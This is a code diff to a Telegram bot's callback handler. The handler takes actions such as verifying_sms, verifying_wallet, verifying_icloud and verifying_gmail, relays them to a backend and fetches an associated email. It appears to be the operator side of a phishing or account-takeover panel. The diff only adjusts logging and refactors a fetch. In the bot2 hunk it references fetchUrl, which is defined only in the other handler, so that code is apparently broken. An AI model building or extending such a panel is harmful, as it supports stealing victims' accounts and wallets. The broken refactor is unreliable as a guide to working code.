@@ -289,7 +289,6 @@ bot.on("callback_query", async (query) => {
     if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet" || action === "verifying_icloud" || action === "verifying_gmail") {
       const verifyingId = identifier;
       console.log(`📲 Verifying choice: ${action} for verifyingId: ${verifyingId}`);
-      console.log(`🔍 Bot received verifyingId: ${verifyingId}`);
       
       try {
         const updateResult = await fetch(`${APP_URL}/update-verifying-choice`, {
@@ -313,7 +312,9 @@ bot.on("callback_query", async (query) => {
         await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
         
         try {
-          const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
+          const fetchUrl = `${APP_URL}/get-verifying-info/${verifyingId}`;
+          console.log(`🔍 Fetching: ${fetchUrl}`);
+          const verifyRes = await fetch(fetchUrl);
           const verifyData = await verifyRes.json();
           const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
           
@@ -683,7 +684,7 @@ if (bot2) {
           await bot2.answerCallbackQuery(callbackId, { text: `✅ ${action.toUpperCase()}` });
           
           try {
-            const verifyRes = await fetch(`${APP_URL}/get-verifying-info/${verifyingId}`);
+            const verifyRes = await fetch(fetchUrl);
             const verifyData = await verifyRes.json();
             const verifyEmail = verifyData.displayEmail || verifyData.email || 'unknown@example.com';
             
